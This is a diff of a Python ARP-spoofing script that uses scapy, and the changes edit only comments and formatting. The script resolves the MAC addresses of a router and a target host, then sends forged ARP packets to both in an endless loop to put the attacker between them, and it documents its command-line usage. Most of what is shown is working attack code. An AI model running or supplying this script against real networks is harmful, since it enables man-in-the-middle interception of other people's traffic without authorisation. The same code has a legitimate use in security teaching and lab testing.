@@ -9,9 +9,7 @@ import scapy.all as scapy
 import sys
 import time
 
-# Send malicious packet to target machine to receive as router, and to router to receive on behalf of target machine
-
-
+## Send malicious packet to target machine to receive as router, and to router to receive on behalf of target machine
 # Get MAC address from router and target machine function
 def getMAC(ipAddress):
     broadcastLayer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -28,14 +26,13 @@ def spoof(routerIP, targetIP, routerMAC, targetMAC):
     scapy.send(malpacket1)
     scapy.send(malpacket2)
 
-targetIP = str(sys.argv[2]) # read target IP when run (first arg. is name of program, second is router, third is target. e.g. "python3 arpspoofer 192.168.1.1 192.168.1.4"
-routerIP = str(sys.argv[1]) # read router IP when run
+targetIP = str(sys.argv[2]) # read target IP when run ("sys.argv" is a list in Python, which contains the command-line arguments passed to the script.)
+routerIP = str(sys.argv[1]) # read router IP when run. (first arg. is name of program, second is router, third is target. e.g. "python3 arpspoofer 192.168.1.1 192.168.1.4"
 targetMAC = str(getMAC(targetIP))
 routerMAC = str(getMAC(routerIP))
 
 
-# Spoofing targets loop
-
+# Spoof targets loop
 try:
     while True:
         spoof(routerIP, targetIP, routerMAC, targetMAC)
